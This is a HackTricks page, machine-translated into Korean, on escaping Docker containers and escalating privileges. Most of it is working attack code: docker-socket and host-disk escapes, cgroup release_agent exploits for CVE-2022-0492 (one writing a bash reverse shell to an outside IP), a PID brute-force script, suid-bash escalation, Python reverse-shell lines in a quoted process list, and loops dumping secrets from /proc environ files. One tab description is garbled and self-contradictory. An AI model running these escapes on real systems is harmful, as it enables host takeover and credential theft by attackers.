# Docker Breakout / Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 **세계에서 가장 고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 자동 열거 및 탈출

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): **컨테이너를 열거**할 수도 있습니다
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 이 도구는 **현재 있는 컨테이너를 열거하고 자동으로 탈출을 시도하는 데 유용**합니다
* [**amicontained**](https://github.com/genuinetools/amicontained): 컨테이너가 가진 권한을 얻어 탈출 방법을 찾는 데 유용한 도구
* [**deepce**](https://github.com/stealthcopter/deepce): 컨테이너에서 열거하고 탈출하는 도구
* [**grype**](https://github.com/anchore/grype): 이미지에 설치된 소프트웨어의 CVE 가져오기

## 마운트된 도커 소켓 탈출

만약 **도커 소켓이 도커 컨테이너 내에 마운트**되어 있는 것을 발견하면 탈출할 수 있습니다.\
이는 일반적으로 도커 컨테이너에서 도커 데몬에 연결하여 작업을 수행해야 하는 경우에 발생합니다.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
이 경우 일반적인 도커 명령을 사용하여 도커 데몬과 통신할 수 있습니다:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
만약 **도커 소켓이 예상치 못한 위치에** 있다면, **`docker`** 명령어를 사용하여 **`-H unix:///path/to/docker.sock`** 매개변수를 추가하여 통신할 수 있습니다.
{% endhint %}

도커 데몬은 또한 [포트에서 (기본값 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) 수신할 수 있으며, Systemd 기반 시스템에서는 Docker 데몬과의 통신이 Systemd 소켓 `fd://`을 통해 발생할 수 있습니다.

{% hint style="info" %}
추가로, 다른 고수준 런타임의 런타임 소켓에 주의를 기울여야 합니다:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities 남용 탈출

컨테이너의 권한을 확인해야 합니다. 다음 중 하나라도 해당된다면 컨테이너에서 탈출할 수 있을 수 있습니다: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

현재 컨테이너 권한을 확인하려면 **이전에 언급된 자동 도구**를 사용하거나 다음을 사용할 수 있습니다:
```bash
capsh --print
```
## 특권 컨테이너 탈출

특권 컨테이너는 다음과 같은 플래그를 사용하여 생성할 수 있습니다: `--privileged` 또는 특정 방어 기능을 비활성화하는 방법:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `/dev`를 마운트

`--privileged` 플래그는 컨테이너 보안을 크게 낮추며 **제한 없는 장치 액세스**를 제공하고 **여러 보호 기능을 우회**합니다. 자세한 내용은 `--privileged`의 전체 영향에 대한 문서를 참조하십시오.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### 특권 + hostPID

이러한 권한을 사용하면 단순히 호스트에서 루트로 실행 중인 init (pid:1)와 같은 프로세스의 네임스페이스로 이동할 수 있습니다. 다음을 실행하여 테스트할 수 있습니다: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

컨테이너에서 실행하여 테스트해보세요:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### 특권

특권 플래그만으로 호스트의 디스크에 액세스하거나 release\_agent를 남용하여 탈출을 시도할 수 있습니다.

컨테이너에서 다음 우회 방법을 시험해보세요:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### 디스크 마운트 - Poc1

잘 구성된 도커 컨테이너는 **fdisk -l**과 같은 명령을 허용하지 않을 것입니다. 그러나 잘못 구성된 도커 명령어에서 `--privileged` 또는 `--device=/dev/sda1`와 같은 플래그가 지정된 경우, 호스트 드라이브를 볼 수 있는 권한을 얻을 수 있습니다.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

따라서 호스트 머신을 탈취하는 것은 간단합니다:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
그리고 완성! 호스트 파일 시스템에 액세스할 수 있습니다. 왜냐하면 `/mnt/hola` 폴더에 마운트되어 있기 때문입니다.

#### 디스크 마운트 - Poc2

컨테이너 내에서 공격자는 클러스터에 의해 생성된 쓰기 가능한 hostPath 볼륨을 통해 기존 호스트 OS에 대한 추가 액세스를 시도할 수 있습니다. 아래는 컨테이너 내에서 이 공격자 벡터를 활용할 수 있는지 확인할 수 있는 몇 가지 일반적인 사항입니다:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privileged Escape 기존 release\_agent 악용 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="초기 PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### 생성된 release_agent를 악용한 특권 탈출 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

**기법에 대한 설명**은 다음에서 찾을 수 있습니다:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### 알려진 상대 경로 없이 release\_agent를 악용한 특권 탈출 - PoC3

이전 공격에서는 **호스트 파일 시스템 내 컨테이너의 절대 경로가 노출**되었습니다. 그러나 항상 그런 것은 아닙니다. 호스트 내부의 컨테이너의 **절대 경로를 모르는 경우** 이 기술을 사용할 수 있습니다:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
특권이 부여된 컨테이너 내에서 PoC를 실행하면 다음과 유사한 출력이 제공되어야 합니다:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### 권한 상승을 이용한 민감한 마운트 남용

**기본 호스트에 대한 정보를 제공하는 여러 파일이 마운트**될 수 있습니다. 이 중 일부는 호스트에서 **어떤 일이 발생할 때 실행되어야 하는 내용을 나타낼 수도** 있습니다 (공격자가 컨테이너를 탈출할 수 있게 합니다).\
이러한 파일들의 남용으로 다음이 가능할 수 있습니다:

* release\_agent (이미 이전에 다룸)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

그러나 이 페이지에서 **다른 민감한 파일**을 확인할 수 있습니다:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### 임의의 마운트

여러 경우에 **컨테이너에 호스트로부터의 볼륨이 마운트**된 것을 발견할 수 있습니다. 이 볼륨이 올바르게 구성되지 않았다면 **민감한 데이터에 액세스/수정**할 수 있을 수 있습니다: 비밀 정보 읽기, ssh authorized\_keys 변경...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2개의 쉘과 호스트 마운트를 이용한 권한 상승

만약 **컨테이너 내에서 root 권한으로 액세스**할 수 있는 상태이고 호스트의 특정 폴더가 마운트되어 있으며 **비특권 사용자로 호스트로 이탈**하여 마운트된 폴더에 대한 읽기 액세스가 있다면, \
**컨테이너 내의 마운트된 폴더**에 **bash suid 파일**을 생성하고 호스트에서 해당 파일을 실행하여 권한 상승을 할 수 있습니다.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2개의 쉘을 사용한 권한 상승

만약 **컨테이너 내에서 root로 액세스**할 수 있고 **비특권 사용자로 호스트로 이탈**할 수 있다면, 컨테이너 내에서 MKNOD 기능(기본적으로 제공됨)을 사용하여 **호스트 내에서 권한 상승**을 악용할 수 있습니다. 이에 대한 설명은 [**이 게시물**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)에서 확인할 수 있습니다.\
이러한 기능을 통해 컨테이너 내의 root 사용자는 **블록 장치 파일을 생성**할 수 있습니다. 장치 파일은 **하드웨어 및 커널 모듈에 액세스**하는 데 사용되는 특수 파일입니다. 예를 들어, /dev/sda 블록 장치 파일은 **시스템 디스크의 원시 데이터를 읽을 수 있게** 합니다.

도커는 컨테이너 내에서 블록 장치 오용을 방지하기 위해 **블록 장치 읽기/쓰기 작업을 차단하는 cgroup 정책**을 시행합니다. 그러나, 컨테이너 내에서 블록 장치가 **생성**되면, **/proc/PID/root/** 디렉토리를 통해 컨테이너 외부에서 액세스할 수 있습니다. 이 액세스는 **프로세스 소유자가 컨테이너 내외에서 동일**해야 합니다.

이 [**글에서의**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) **악용** 예시:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

호스트의 프로세스에 액세스할 수 있다면 해당 프로세스에 저장된 많은 민감한 정보에 액세스할 수 있습니다. 테스트 랩을 실행하세요:
```
docker run --rm -it --pid=host ubuntu bash
```
예를 들어, `ps auxn`과 같은 것을 사용하여 프로세스 목록을 볼 수 있고 명령어에서 민감한 세부 정보를 검색할 수 있습니다.

그런 다음, 호스트의 각 프로세스에 액세스할 수 있기 때문에 `/proc/`에서 그들의 환경 비밀을 도둑질할 수 있습니다:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
당신은 또한 **다른 프로세스의 파일 디스크립터에 액세스하고 그들이 열어 둔 파일을 읽을 수 있습니다**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
당신은 또한 **프로세스를 종료하고 DoS를 유발**할 수 있습니다.

{% hint style="warning" %}
만약 컨테이너 외부의 프로세스에 대한 특권 **액세스가 있다면**, `nsenter --target <pid> --all` 또는 `nsenter --target <pid> --mount --net --pid --cgroup`와 같은 것을 실행하여 **해당 프로세스와 동일한 ns 제한** (희망컨대 없음) **을 가진 셸을 실행할 수 있습니다.**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
만약 컨테이너가 Docker [호스트 네트워킹 드라이버(`--network=host`)](https://docs.docker.com/network/host/)로 구성된 경우, 해당 컨테이너의 네트워크 스택은 Docker 호스트와 격리되지 않습니다 (컨테이너는 호스트의 네트워킹 네임스페이스를 공유하며, 컨테이너에 자체 IP 주소가 할당되지 않습니다). 다시 말해, **컨테이너는 모든 서비스를 직접 호스트의 IP에 바인딩**합니다. 또한 컨테이너는 공유 인터페이스에서 호스트가 송수신하는 **모든 네트워크 트래픽을 가로챌 수 있습니다 (`tcpdump -i eth0`)**.

예를 들어, 이를 사용하여 호스트와 메타데이터 인스턴스 간의 트래픽을 **스니핑하고 조작**할 수 있습니다.

다음 예시들과 같이:

* [Writeup: Google SRE에 연락하는 방법: 클라우드 SQL에 쉘 삽입](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [메타데이터 서비스 MITM을 통한 루트 권한 상승 (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

또한 호스트 내부에서 **로컬호스트에 바인딩된 네트워크 서비스에 액세스**하거나, 컨테이너가 액세스할 수 있는 것과 다를 수 있는 **노드의 메타데이터 권한에 액세스**할 수도 있습니다.

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true`로 설정하면 호스트의 프로세스 간 통신 (IPC) 리소스에 액세스할 수 있습니다. 이는 `/dev/shm`의 **공유 메모리**와 같은 IPC 리소스를 읽고 쓸 수 있게 해줍니다. 이는 동일한 IPC 리소스를 다른 호스트나 파드 프로세스에서 사용하는 경우입니다. 이러한 IPC 메커니즘을 자세히 살펴보려면 `ipcs`를 사용하세요.

* **/dev/shm 검사** - 이 공유 메모리 위치에서 파일을 확인하세요: `ls -la /dev/shm`
* **기존 IPC 시설 검사** - `/usr/bin/ipcs`를 사용하여 사용 중인 IPC 시설이 있는지 확인할 수 있습니다. 다음 명령어로 확인하세요: `ipcs -a`

### 권한 복구

시스템 호출 **`unshare`**가 금지되지 않은 경우 다음을 실행하여 모든 권한을 복구할 수 있습니다:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### 심볼릭 링크를 통한 사용자 네임스페이스 남용

포스트 [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)에서 설명된 두 번째 기술은 사용자 네임스페이스를 통해 바인드 마운트를 남용하여 호스트 내의 파일에 영향을 줄 수 있는 방법을 보여줍니다 (해당 경우에서는 파일을 삭제하는 것).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급 커뮤니티 도구**를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc exploit (CVE-2019-5736)

루트로 `docker exec`를 실행할 수 있는 경우(아마도 sudo로), CVE-2019-5736을 남용하여 컨테이너를 탈출하여 권한을 상승시킬 수 있습니다 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). 이 기술은 기본적으로 **호스트의 _/bin/sh_** 바이너리를 **컨테이너에서 덮어쓸 것**이므로, docker exec를 실행하는 사람은 페이로드를 트리거할 수 있습니다.

페이로드를 변경하고 `go build main.go`로 main.go를 빌드하세요. 결과 바이너리는 실행을 위해 docker 컨테이너에 배치되어야 합니다.\
실행 시, `[+] Overwritten /bin/sh successfully`가 표시되면 호스트 머신에서 다음을 실행해야 합니다:

`docker exec -it <container-name> /bin/sh`

이는 main.go 파일에 있는 페이로드를 트리거합니다.

자세한 정보: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
컨테이너가 취약할 수 있는 다른 CVE들이 있습니다. 목록은 [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)에서 찾을 수 있습니다.
{% endhint %}

## Docker Custom Escape

### Docker Escape Surface

* **네임스페이스:** 프로세스는 네임스페이스를 통해 **다른 프로세스와 완전히 분리**되어야 하므로, 네임스페이스로 인해 다른 프로세스와 상호작용을 탈출할 수 없습니다 (기본적으로 IPC, 유닉스 소켓, 네트워크 서비스, D-Bus, 다른 프로세스의 `/proc`를 통해 통신할 수 없음).
* **루트 사용자**: 기본적으로 프로세스를 실행하는 사용자는 루트 사용자입니다 (그러나 권한은 제한됨).
* **캐퍼빌리티:** Docker는 다음 캐퍼빌리티를 남겨 두었습니다: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **시스콜:** 이러한 시스콜은 **루트 사용자가 호출할 수 없는 시스콜**입니다 (캐퍼빌리티 부족 + Seccomp 때문). 다른 시스콜을 사용하여 탈출을 시도할 수 있습니다.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 시스템 호출" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}syscall_bf.c 파일에는 Docker 컨테이너에서 호스트 시스템의 커널에 직접 시스템 호출을 수행하는 코드가 포함되어 있습니다. 이를 통해 특권 상승을 이용하여 컨테이너를 벗어나는 공격이 가능해집니다. 이 코드는 컨테이너 내에서 실행되는 프로세스가 호스트 시스템에 루트 권한으로 액세스할 수 있도록 해주는 취약점을 악용할 수 있습니다. 이러한 취약점을 통해 공격자는 호스트 시스템 전체에 액세스할 수 있게 됩니다. 이러한 공격은 Docker 컨테이너의 보안을 강화하는 데 중요한 역할을 합니다. %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

